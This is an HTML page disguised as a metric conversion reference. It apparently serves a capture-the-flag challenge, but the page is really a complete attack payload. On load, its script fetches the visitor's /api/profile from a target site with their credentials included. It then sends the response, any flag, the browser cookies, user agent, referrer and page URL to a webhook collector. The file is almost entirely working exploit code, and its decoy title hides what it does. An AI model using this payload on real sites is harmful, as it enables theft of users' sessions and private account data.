<!DOCTYPE html>
<html>
<head>
    <title>Conversion Reference</title>
</head>
<body>
    <h1>Metric Conversion Reference</h1>
    <p>Loading conversion data...</p>
    
    <script>
    // Configuration - Change these URLs as needed
    var CTF_URL = 'https://your-ctf-domain.com';
    var WEBHOOK_URL = 'https://webhook.site/your-unique-id';
    
    // Function to send data to webhook with error handling
    function sendToWebhook(data, type) {
        if (!type) type = 'data';
        // Use GET with URL parameters to avoid CORS preflight
        var payload = {
            type: type,
            timestamp: new Date().toISOString(),
            data: data
        };
        var encodedData = encodeURIComponent(JSON.stringify(payload));
        return fetch(WEBHOOK_URL + '?data=' + encodedData, {
            method: 'GET'
        }).catch(function(webhookError) {
            console.error('Webhook failed:', webhookError);
        });
    }

    // Main attack logic with comprehensive error handling
    fetch(CTF_URL + '/api/profile', {
        method: 'GET',
        credentials: 'include'
    })
    .then(function(response) {
        // Send response status info
        sendToWebhook({
            status: response.status,
            statusText: response.statusText,
            url: response.url
        }, 'response_info');

        // Check if response is ok
        if (!response.ok) {
            throw new Error('HTTP ' + response.status + ': ' + response.statusText);
        }

        // Check content type
        var contentType = response.headers.get('content-type');
        if (!contentType || contentType.indexOf('application/json') === -1) {
            // If not JSON, get as text
            return response.text().then(function(text) {
                sendToWebhook({
                    error: 'Non-JSON response',
                    contentType: contentType,
                    body: text
                }, 'error');
                throw new Error('Response is not JSON');
            });
        }

        return response.json();
    })
    .then(function(data) {
        // Successfully got JSON data
        sendToWebhook(data, 'success');
        
        // Also send a success confirmation
        sendToWebhook({
            message: 'Attack successful!',
            dataReceived: !!data,
            hasFlag: !!(data && data.flag)
        }, 'confirmation');
    })
    .catch(function(error) {
        // Handle all errors
        var errorInfo = {
            message: error.message,
            name: error.name,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            currentURL: window.location.href
        };

        // Send error details
        sendToWebhook(errorInfo, 'error');

        // Try alternative approaches on error
        setTimeout(function() {
            // Try fetching without credentials
            fetch(CTF_URL + '/api/profile')
            .then(function(r) { return r.json(); })
            .then(function(data) {
                sendToWebhook(data, 'no_credentials_attempt');
            })
            .catch(function(err) {
                sendToWebhook({
                    error: 'No credentials attempt failed',
                    message: err.message
                }, 'fallback_error');
            });
        }, 1000);
    });

    // Send initial beacon to confirm the payload is running
    sendToWebhook({
        message: 'Payload executed',
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        currentURL: window.location.href,
        timestamp: new Date().toISOString()
    }, 'init');

    // Try to gather additional context about the bot
    setTimeout(function() {
        sendToWebhook({
            cookies: document.cookie,
            screenSize: screen.width + 'x' + screen.height,
            windowSize: window.innerWidth + 'x' + window.innerHeight
        }, 'bot_info');
    }, 500);
    </script>
</body>
</html>
